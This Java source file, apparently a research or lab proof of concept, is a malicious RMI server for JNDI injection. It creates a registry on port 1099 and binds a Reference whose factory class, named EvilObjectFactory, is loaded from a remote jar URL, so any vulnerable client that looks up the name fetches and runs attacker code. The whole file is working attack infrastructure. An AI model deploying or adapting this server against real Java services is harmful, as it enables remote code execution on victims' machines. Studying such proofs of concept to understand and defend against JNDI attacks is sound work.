package com.trganda.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilRMIServer {
    public static void main(String[] args) {
        try {
            Registry reg = LocateRegistry.createRegistry(1099);
            String url = "http://localhost:8081/jndi-1.0.jar";

            Reference reference = new Reference("EvilObjecactory", "com.trganda.factory.EvilObjectFactory", url);
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            RemoteServiceImpl rsi = new RemoteServiceImpl();

            reg.bind("foo", wrapper);
            reg.bind("method", rsi);

            System.out.println("Listening...");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
